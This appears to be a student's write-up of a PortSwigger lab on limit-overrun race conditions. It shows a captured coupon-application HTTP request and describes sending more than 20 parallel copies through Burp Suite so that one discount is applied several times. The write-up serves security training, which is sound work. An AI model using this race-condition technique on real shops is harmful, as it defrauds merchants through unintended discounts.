---
title: Limit overrun race conditions
description: PortSwigger Race Conditions Lab
---
This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.

To solve the lab, successfully purchase a **Lightweight L33t Leather Jacket**.

You can log in to your account with the following credentials: `wiener:peter`.

For a faster and more convenient way to trigger the race condition, we recommend that you solve this lab using the [Trigger race conditions](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/ProbeForRaceCondition.bambda) custom action. This is only available in Burp Suite Professional.

## Discovery
Apply coupon request
```http
POST /cart/coupon HTTP/2
Host: 0aed003f04499c76842e86bd00c3007c.web-security-academy.net
Cookie: session=D4r7k75cS5z15xyhJEcHePjNSQdu35et
Content-Length: 52
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Origin: https://0aed003f04499c76842e86bd00c3007c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aed003f04499c76842e86bd00c3007c.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=YUhjuKQ706D3mEJHyJuumE2XrHbN46kr&coupon=PROMO20
```

## Exploit
Make 20+ copies of request in Burp Suite then "Create Group tab".
![](../../../../public/images/PS_Race_Conditions_20250612%20_214543.png)

Coupon applied multiple times.
![](../../../../public/images/PS_Race_Conditions_20250612%20_214933.png) 


